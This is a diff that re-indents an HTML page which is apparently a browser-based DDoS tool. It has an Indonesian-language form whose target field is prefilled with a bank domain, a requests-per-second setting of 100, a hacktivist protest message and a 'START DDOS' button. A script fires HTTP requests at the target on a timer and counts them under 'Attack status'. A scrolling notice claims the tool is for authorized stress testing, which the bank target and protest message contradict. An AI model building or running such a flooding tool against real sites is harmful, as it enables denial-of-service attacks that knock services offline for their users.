@@ -1,16 +1,12 @@
 <html>
-
-<head>
-
-    <title>Mr. W | INDONESIA</title>
-
-   <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/wahid7ark/wahid7ark.github.io/refs/heads/main/icon.png" />   
-
-</head>
-
-<style type="text/css">
-
-body
+    <head>
+        <title>
+            Mr. W | INDONESIA
+        </title>
+        <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/wahid7ark/wahid7ark.github.io/refs/heads/main/icon.png" />
+    </head>
+    <style type="text/css">
+        body
 
 {
 
@@ -59,72 +55,76 @@ background-color:yellow;
 }
 
 }
-
-</style>
-
-<center><img style="width:90%" src="https://raw.githubusercontent.com/wahid7ark/wahid7ark.github.io/refs/heads/main/369.png"></center>
-
-<body style="background-color:#1a1a1a; color:#FFFFFF;">
-
-<center>
-
-        <legend>Masukkan URL Target:</legend>
-
-        <label>URL: <br /> <input id="targetURL" style="width:60%;height:25px" value="http://www.unionbank.co.li" /></label><br> <!-- disabled="true" --> 
-
-        <small>Contoh : http://wahid7ark.github.io</small><br><br>
-
-
-
-          
-
-     
-
-        <legend>Optional. Options</legend>
-
-         <label>Requests per detik : <input style="width:40px;" id="rps" value="100" /></label><br />
-
-
-
-         <label>Masukkan Pesan : <br /><input style="width:60%;" id="message" value="Perlawanan digital melawan dunia yang kecanduan perang!" /></label><br><br>
-
-    
-
-<legend>Sudah Siap? Klik!</legend>
-
-
-
-        <button id="fireButton" style="background-color:black; border-color:#FFF; color:#FFF; width:240px; height:70px;">START</button><br>
-
-
-
-
-
-     
-
-         <legend>####################<br>Attack status:</legend>
-
-        <dl>
-
-            <dt>Requested:</dt>
-
-            <dd id="requestedCtr">0</dd>
-
-            <dt style="opacity: 0.5; color: blue;">Request OK :</dt>
-
-            <dd style="opacity: 0.5" id="succeededCtr">0</dd>
-
-            <dt style="opacity: 0.5; color: red;">Request failed :</dt>
-
-            <dd style="opacity: 0.5" id="failedCtr">0</dd>
-
-        </dl>
-
-
-
-    <script>
-
-        (function () {
+    </style>
+    <center>
+        <img style="width:90%" src="https://raw.githubusercontent.com/wahid7ark/wahid7ark.github.io/refs/heads/main/369.png">
+        </center>
+        <body style="background-color:#1a1a1a; color:#FFFFFF;">
+            <center>
+                <legend>
+                    Masukkan URL Target:
+                </legend>
+                <label>
+                    URL:
+                    <br />
+                    <input id="targetURL" style="width:60%;height:25px" value="http://www.unionbank.co.li" />
+                </label>
+                <br>
+                    <!-- disabled="true" -->
+                        <small>
+                            Contoh : http://wahid7ark.github.io
+                        </small>
+                        <br>
+                            <br>
+                                <legend>
+                                    Optional. Options
+                                </legend>
+                                <label>
+                                    Requests per detik :
+                                    <input style="width:40px;" id="rps" value="100" />
+                                </label>
+                                <br />
+                                <label>
+                                    Masukkan Pesan :
+                                    <br />
+                                    <input style="width:60%;" id="message" value="Perlawanan digital melawan dunia yang kecanduan perang!" />
+                                </label>
+                                <br>
+                                    <br>
+                                        <legend>
+                                            Sudah Siap? Klik!
+                                        </legend>
+                                        <button id="fireButton" style="background-color:black; border-color:#FFF; color:#FFF; width:240px; height:70px;">
+                                            START
+                                        </button>
+                                        <br>
+                                            <legend>
+                                                ####################
+                                                <br>
+                                                    Attack status:
+                                                </legend>
+                                                <dl>
+                                                    <dt>
+                                                        Requested:
+                                                    </dt>
+                                                    <dd id="requestedCtr">
+                                                        0
+                                                    </dd>
+                                                    <dt style="opacity: 0.5; color: blue;">
+                                                        Request OK :
+                                                    </dt>
+                                                    <dd style="opacity: 0.5" id="succeededCtr">
+                                                        0
+                                                    </dd>
+                                                    <dt style="opacity: 0.5; color: red;">
+                                                        Request failed :
+                                                    </dt>
+                                                    <dd style="opacity: 0.5" id="failedCtr">
+                                                        0
+                                                    </dd>
+                                                </dl>
+                                                <script>
+                                                    (function () {
 
             var fireInterval;
 
@@ -277,17 +277,12 @@ isFiring = true;
 document.getElementById("fireButton").innerHTML = "START DDOS";
 
 fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
-
-    </script>
-
-	<center>
-
-	<div class="notice">
-
-<marquee>For authorized load and stress testing purposes only | Feedback and suggestions can be sent via email: nullfbook@gmail.com</marquee>
-
-</div>
-
-</body>
-
-</html>
+                                                </script>
+                                                <center>
+                                                    <div class="notice">
+                                                        <marquee>
+                                                            For authorized load and stress testing purposes only | Feedback and suggestions can be sent via email: nullfbook@gmail.com
+                                                        </marquee>
+                                                    </div>
+                                                </body>
+                                            </html>
